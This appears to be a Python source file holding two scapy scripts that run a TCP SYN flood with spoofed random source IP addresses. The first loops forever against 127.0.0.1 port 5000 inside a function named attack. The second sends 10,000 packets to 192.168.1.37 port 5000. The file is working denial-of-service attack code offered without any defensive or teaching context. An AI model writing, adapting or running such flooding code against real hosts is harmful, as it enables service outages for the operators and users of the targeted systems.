import random
from scapy.all import *

def attack():
    while(1):
        IP_packet = scapy.all.IP()
        IP_packet.dst = "127.0.0.1"
        IP_packet.src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1, 254),
                                            random.randint(1, 254), random.randint(1, 254))

        TCP_packet = scapy.all.TCP()
        TCP_packet.sport = random.randint(10000, 65535)
        TCP_packet.dport = 5000
        TCP_packet.flags = 'S'

        try:
            scapy.all.send(IP_packet / TCP_packet, verbose=0)
            print("Packet Sent")
        except:
            print("Packet Failed")
            exit()


from scapy.all import *

# IP address of the target server
target_ip = "192.168.1.37"

# Number of packets to send
num_packets = 10000

# Loop through and send packets
for i in range(num_packets):
    # Create an IP packet with a random source IP address
    packets = IP(src=RandIP(), dst=target_ip)/TCP(sport = 80, dport=5000, flags="S")
    
    # Send the packet
    send(packets)
    
    # Print progress
    print(f"Sent packet {i+1} to {target_ip}")
